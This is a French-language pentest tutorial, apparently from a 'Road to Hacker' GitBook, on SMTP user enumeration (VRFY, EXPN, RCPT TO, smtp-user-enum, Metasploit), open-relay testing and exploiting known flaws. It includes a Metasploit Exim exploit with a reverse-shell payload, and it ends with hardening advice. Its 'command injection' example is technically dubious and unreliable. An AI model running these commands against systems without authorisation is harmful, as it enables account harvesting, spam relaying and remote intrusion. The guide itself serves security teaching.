# SMTP

### **SMTP - Énumération et Pentest - Guide Complet**

⚠️ **Avertissement** : Ce contenu est strictement destiné à un usage éducatif et éthique dans le domaine de la cybersécurité. Toute utilisation illégale ou malveillante est interdite et engage la seule responsabilité de l’utilisateur.

***

### **Introduction**

Le **Simple Mail Transfer Protocol (SMTP)** est souvent utilisé comme point d'entrée dans des infrastructures vulnérables. Lors de tests d'intrusion, l'énumération et l'exploitation de serveurs SMTP peuvent révéler des utilisateurs valides, des failles de configuration, ou des informations sensibles sur le réseau.

Ce guide couvre les étapes pratiques d’énumération et d’exploitation de SMTP, en respectant un cadre légal et éthique.

***

### **🚀 Étape 1 : Préparation**

**1. Prérequis**

* Un environnement d'audit avec les outils suivants :
  * **Telnet** ou **Netcat** pour interagir avec le serveur.
  * **Nmap** pour la reconnaissance.
  * **SMTP User Enumeration Tools** comme `smtp-user-enum` ou `Metasploit`.

**2. Comprendre les Ports SMTP**

* **Port 25** : Communication entre serveurs SMTP (souvent utilisé pour les tests).
* **Port 465** : SMTP avec SSL (sécurisé).
* **Port 587** : SMTP avec STARTTLS (sécurisé et recommandé).

***

### **🛠️ Étape 2 : Énumération de Base de SMTP**

**1. Scanner SMTP avec Nmap**

L'objectif est d'identifier si SMTP est ouvert et quelles fonctionnalités sont activées.

Commande :

```bash
nmap -p 25,465,587 --script smtp-commands,smtp-enum-users <target>
```

**Explications :**

* `smtp-commands` : Liste les commandes supportées par le serveur SMTP.
* `smtp-enum-users` : Énumère les utilisateurs SMTP.

***

**2. Identifier les Commandes SMTP Supportées**

1.  Connectez-vous avec Telnet ou Netcat :

    ```bash
    telnet <target> 25
    ```

    ou

    ```bash
    nc <target> 25
    ```
2. Interagissez avec le serveur :
   *   Démarrez la session :

       ```bash
       EHLO example.com
       ```
   * Observez les commandes supportées (comme `VRFY`, `EXPN`, etc.).

**Résultats attendus :**

* **VRFY** : Vérifie si un utilisateur existe.
* **EXPN** : Développe une liste de distribution pour révéler les membres.
* **RCPT TO** : Teste si une adresse est valide.

***

**3. Tester des Utilisateurs avec VRFY**

Si le serveur accepte la commande `VRFY`, vous pouvez énumérer les utilisateurs.

Commande :

```bash
VRFY username
```

**Exemple :**

```bash
VRFY admin
250 OK
```

Si l’utilisateur existe, le serveur retourne un code 250. Sinon, un code d’erreur comme 550 peut apparaître.

***

**4. Tester des Groupes avec EXPN**

Si `EXPN` est disponible, développez une liste de distribution pour révéler les membres.

Commande :

```bash
EXPN mailinglist
```

**Résultat attendu :**

* Liste des membres du groupe.

***

**5. Brute-Force des Utilisateurs**

Si `VRFY` et `EXPN` sont désactivés, testez des adresses via `RCPT TO` :

```bash
MAIL FROM:<test@example.com>
RCPT TO:<admin@example.com>
```

Un code 250 indique une adresse valide.

Automatisez cette approche avec des outils comme **smtp-user-enum**.

***

### **🔍 Étape 3 : Utilisation d'Outils Spécialisés**

**1. smtp-user-enum**

Cet outil énumère les utilisateurs SMTP automatiquement.

Commande :

```bash
smtp-user-enum -M VRFY -U usernames.txt -t <target>
```

**Explications :**

* `-M VRFY` : Utilise la commande `VRFY`.
* `-U usernames.txt` : Fichier contenant les noms d’utilisateur à tester.
* `-t <target>` : Adresse IP ou domaine cible.

Autres modes :

* `-M EXPN` : Utilise la commande `EXPN`.
* `-M RCPT` : Utilise `RCPT TO` pour tester les adresses.

***

**2. Metasploit Framework**

Le module Metasploit `auxiliary/scanner/smtp/smtp_enum` peut automatiser l’énumération.

1.  Lancez Metasploit :

    ```bash
    msfconsole
    ```
2.  Configurez le module :

    ```bash
    use auxiliary/scanner/smtp/smtp_enum
    set RHOSTS <target>
    set USER_FILE usernames.txt
    set THREADS 10
    run
    ```

**Résultat attendu :**

* Une liste des utilisateurs valides.

***

### **🧪 Étape 4 : Pentest Avancé de SMTP**

**1. Test de Transfert de Relais (Open Relay)**

Un serveur SMTP mal configuré peut permettre l’envoi de courriels non autorisés, facilitant le spam ou l’usurpation.

1.  Connectez-vous avec Telnet ou Netcat :

    ```bash
    telnet <target> 25
    ```
2.  Testez l’envoi via un domaine tiers :

    ```bash
    MAIL FROM:<test@externaldomain.com>
    RCPT TO:<victim@example.com>
    DATA
    Subject: Test Open Relay

    This is a test message.
    .
    ```
3. Si le message est accepté, le serveur est vulnérable.

***

**2. Injection de Commandes SMTP**

Si des filtres ou systèmes de journalisation sont actifs, testez les injections de commandes via l’en-tête `DATA`.

Exemple :

```makefile
DATA
Subject: Test Injection
X-Command: VRFY admin
.
```

***

**3. Analyse des Informations de Bannière**

Lors de la connexion, SMTP expose souvent une bannière comme :

```mathematica
220 mail.example.com ESMTP Postfix
```

Utilisez ces informations pour :

* Identifier la version du serveur SMTP.
* Rechercher des vulnérabilités connues.

***

### **📋 Étape 5 : Exploitation de Vulnérabilités Connues**

**1. Recherche de Vulnérabilités**

Utilisez des bases comme :

* [Exploit-DB](https://www.exploit-db.com/)
* [CVE Details](https://www.cvedetails.com/)

Recherchez les vulnérabilités associées à la version du serveur SMTP, comme :

* Exploits spécifiques à Postfix, Exim, ou Microsoft Exchange.
* Vulnérabilités d’exécution de code à distance.

***

**2. Exploitation avec Metasploit**

Utilisez des modules d’exploit SMTP dans Metasploit. Exemple :

```bash
use exploit/unix/smtp/exim_patched
set RHOSTS <target>
set PAYLOAD cmd/unix/reverse
run
```

***

### **🔧 Étape 6 : Contre-mesures et Sécurisation**

**1. Désactiver les Commandes Sensibles**

* Désactivez `VRFY` et `EXPN` pour éviter l’énumération.

**2. Configurer les Permissions de Relais**

* Restreignez le relais SMTP pour qu’il n’accepte que les adresses locales ou authentifiées.

**3. Utiliser STARTTLS**

* Chiffrez les communications pour empêcher l’interception des informations.

**4. Implémenter SPF, DKIM, et DMARC**

* Configurez ces mécanismes pour protéger contre le spoofing.

**5. Surveiller les Journaux**

* Analysez régulièrement les logs SMTP pour détecter des activités suspectes.

***

### **📖 Bonnes Pratiques pour l’Énumération et le Pentest de SMTP**

* **Testez légalement :** Assurez-vous d’avoir une autorisation explicite pour auditer un serveur.
* **Documentez vos découvertes :** Notez les configurations vulnérables et proposez des recommandations.
* **Combinez avec d’autres outils :** Utilisez SMTP en conjonction avec d’autres services (DNS, LDAP) pour une analyse approfondie.

***

**Liens utiles :**

* [Mentions légales](https://dika-1.gitbook.io/road-to-hacker/mentions-legales)
* [Politique de confidentialité](https://dika-1.gitbook.io/road-to-hacker/politique-de-confidentialite)
* [Contactez-nous](mailto:dika-road-to-hacker@protonmail.com)
